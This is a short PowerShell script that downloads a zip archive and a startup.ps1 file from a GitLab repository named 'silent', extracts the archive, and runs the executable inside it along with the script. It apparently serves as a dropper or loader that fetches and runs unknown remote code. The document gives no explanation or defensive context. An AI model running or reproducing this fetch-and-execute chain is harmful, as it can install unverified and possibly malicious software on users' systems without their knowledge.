Invoke-WebRequest https://gitlab.com/jamet1/silent/-/raw/main/test.zip -Outfile test.zip
Invoke-WebRequest https://gitlab.com/jamet1/silent/-/raw/main/startup.ps1 -Outfile startup.ps1
Expand-Archive -LiteralPath ‘test.zip‘ -DestinationPath ‘test‘
./test/test.exe
./startup.ps1
